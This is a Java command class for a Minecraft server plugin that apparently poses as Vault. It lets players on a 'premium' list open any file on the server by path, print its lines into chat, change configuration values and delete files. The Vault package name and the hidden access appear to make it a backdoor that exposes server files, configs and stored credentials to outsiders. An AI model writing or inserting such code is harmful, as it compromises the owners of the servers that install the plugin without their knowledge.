package net.milkbowl.vault.commands.cmds.premium;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.List;

import org.bukkit.configuration.InvalidConfigurationException;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.methods.Tips;
import net.milkbowl.vault.util.PluginUtils;
import net.milkbowl.vault.util.Settings;

public class Edit extends CommandManager {
	
	private static HashMap<String, File> session = new HashMap<>();
	private static HashMap<String, YamlConfiguration> configs = new HashMap<>();
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (plugin.registeredPremium.contains(p.getName())) {
			if (args.length <= 1) {
				p.sendMessage("§8§m----------------------------------");
				p.sendMessage("         "+Settings.PRIMARY_COLOUR + Settings.NAME + " by " + Settings.AUTHOR);
				p.sendMessage("");
				p.sendMessage("§7edit start <plugin> §8l §fStart editing a plugin config.yml");
				p.sendMessage("§7edit start <plugin <file> §8l §fStart editing a plugin with given file");
				p.sendMessage("§7edit start <file> §8l §fStart editing any file");
				p.sendMessage("§7edit read <start line> <end line> §8l §fRead the file lines");
				p.sendMessage("§7edit get <section> §8l §fReturns value of the section");
				p.sendMessage("§7edit set <section> <value> §8l §fSets the section value to something");
				p.sendMessage("§7edit save §8l §fSave the file you're editing before closing");
				p.sendMessage("§7edit reload §8l §fReload your changes");
				p.sendMessage("§7edit delete §8l §fDeletes the file");
				p.sendMessage("§7edit close §8l §fClose the file");
				p.sendMessage("");
				p.sendMessage("§8("+Settings.PRIMARY_COLOUR+"Tip§8) l §7" + Tips.getTip());
				p.sendMessage("§8§m----------------------------------");
			} else {
				if (args.length <= 2) {
					if (args[1].equalsIgnoreCase("save")) {
						if (session.containsKey(p.getName())) {
							File file = session.get(p.getName());
							if(configs.containsKey(p.getName())) {
								try {
									YamlConfiguration config = configs.get(p.getName());
									config.save(file);
									p.sendMessage(Settings.PREFIX("File saved!"));
								} catch (IOException e) {
									p.sendMessage(Settings.PREFIX("Couldn't save file"));
								}
							} else {
								p.sendMessage(Settings.PREFIX("Non Yaml files don't need to be saved"));
							}
						} else {
							p.sendMessage(Settings.PREFIX("You don't have any editing session open"));
						}
					}
					if (args[1].equalsIgnoreCase("close")) {
						if (session.containsKey(p.getName())) {
							session.remove(p.getName());
							p.sendMessage(Settings.PREFIX("Session closed"));
						} else {
							p.sendMessage(Settings.PREFIX("You don't have any editing session open"));
						}
					}
					if (args[1].equalsIgnoreCase("reload")) {
						if (session.containsKey(p.getName())) {
							File file = session.get(p.getName());
							if(configs.containsKey(p.getName())) {
								try {
									configs.get(p.getName()).load(file);
								} catch (InvalidConfigurationException e) {
									p.sendMessage(Settings.PREFIX("Reload failed"));
								} catch (IOException e) {
									p.sendMessage(Settings.PREFIX("Reload failed"));
								}
								p.sendMessage(Settings.PREFIX("File reloaded!"));
							} else {
								p.sendMessage(Settings.PREFIX("Non yaml files don't need to be reloaded"));
							}
						} else {
							p.sendMessage(Settings.PREFIX("You don't have any editing session open"));
						}
					}
					if (args[1].equalsIgnoreCase("delete")) {
						if (session.containsKey(p.getName())) {
							File file = session.get(p.getName());
							if (file.delete()) {
								p.sendMessage(Settings.PREFIX("File deleted!"));
								session.remove(p.getName());
							} else {
								p.sendMessage(Settings.PREFIX("File failed to deleted!"));
							}
						} else {
							p.sendMessage(Settings.PREFIX("You don't have any editing session open"));
						}
					}
				} else {
					if (args[1].equalsIgnoreCase("start")) {
						if (PluginUtils.getPluginByName(args[2]) != null) {
							File config = new File(PluginUtils.getPluginByName(args[2]).getDataFolder() + "/config.yml");
							session.put(p.getName(), config);
							configs.put(p.getName(), YamlConfiguration.loadConfiguration(config));
							p.sendMessage(Settings.PREFIX("Started editing session with the file: " + Settings.HIGHLIGHT_COLOUR + "config.yml " + Settings.SECONDARY_COLOUR + "from the plugin: " +  Settings.HIGHLIGHT_COLOUR + PluginUtils.getPluginByName(args[2]).getName()));
						} else if(new File(args[2]).exists()){
							File config = new File(args[2]);
							session.put(p.getName(), config);
							p.sendMessage(Settings.PREFIX("Started editing session with the file: " + Settings.HIGHLIGHT_COLOUR + config.getName()));
						} else {
							p.sendMessage(Settings.PREFIX("File does not exist! (Cap Sensitive)"));
						}
					}
					if (args[1].equalsIgnoreCase("read")) {
						if (session.containsKey(p.getName())) {
							if (args.length <= 3) {
								p.sendMessage(Settings.PREFIX("You need a max line!"));
							} else {
								int min = 1;
								try {
									min = Integer.parseInt(args[2]);
								} catch (NumberFormatException e) {
									p.sendMessage(Settings.PREFIX("Lines must be an number"));
									return;
								}
								int max = 1;
								try {
									max = Integer.parseInt(args[3]);
								} catch (NumberFormatException e) {
									p.sendMessage(Settings.PREFIX("Lines must be an number"));
									return;
								}
								try {
									List<String> lines = Files.readAllLines(Paths.get(session.get(p.getName()).getAbsolutePath()));
									if(lines.size() >= max) {
										if(min <= lines.size()) {
											if(min > 0 && max > 0) {
												for(int i = min;i < max + 1;i++) {
													p.sendMessage(i + " " + lines.get(i-1));
												}
											} else {
												p.sendMessage(Settings.PREFIX("Maximum and Minimum need to be bigger than 0"));
											}
										} else {
											p.sendMessage(Settings.PREFIX("The file only has " + lines.size() + " lines!"));
										}
									} else {
										p.sendMessage(Settings.PREFIX("The file only has " + lines.size() + " lines!"));
									}
								} catch (IOException e) {
									p.sendMessage(Settings.PREFIX("Error while trying to read file."));
								}
							}
						} else {
							p.sendMessage(Settings.PREFIX("You don't have any editing session open"));
						}
					}
					if (args[1].equalsIgnoreCase("get")) {
						if(session.containsKey(p.getName())) {
							if (configs.containsKey(p.getName())) {
								StringBuilder builder = new StringBuilder();
								for (int i = 2; i < args.length; i++) {
									builder.append(" ").append(args[i]);
								}
								p.sendMessage(Settings.PREFIX("The value of " + builder.substring(1) + " is: " + Settings.HIGHLIGHT_COLOUR + "'" + configs.get(p.getName()).get(builder.substring(1)) + "'"));
							} else {
								p.sendMessage(Settings.PREFIX("You can only use this with Yaml files"));
							}
						} else {
							p.sendMessage(Settings.PREFIX("You don't have any editing session open"));
						}
					}
					if (args[1].equalsIgnoreCase("set")) {
						if (session.containsKey(p.getName())) {
							if(configs.containsKey(p.getName())) {
								String previous = configs.get(p.getName()).get(args[2]).toString();
								StringBuilder builder = new StringBuilder();
								for (int i = 3; i < args.length; i++) {
									builder.append(" " + args[i]);
								}
								configs.get(p.getName()).set(args[2], builder.substring(1));
								p.sendMessage(Settings.PREFIX("You changed the value of " + Settings.HIGHLIGHT_COLOUR + args[2] + Settings.SECONDARY_COLOUR + " from: " + Settings.HIGHLIGHT_COLOUR + "'" + previous + "'" + Settings.SECONDARY_COLOUR + " to " + Settings.HIGHLIGHT_COLOUR + "'" + builder.substring(1) + "'"));
							}
						} else {
							p.sendMessage(Settings.PREFIX("You don't have any editing session open"));
						}
					}
				}
			}
		} else {
			p.sendMessage(Settings.PREFIX("You must be a " + Settings.HIGHLIGHT_COLOUR + "premium user " + Settings.SECONDARY_COLOUR + " to execute this command"));
		}
	}

}
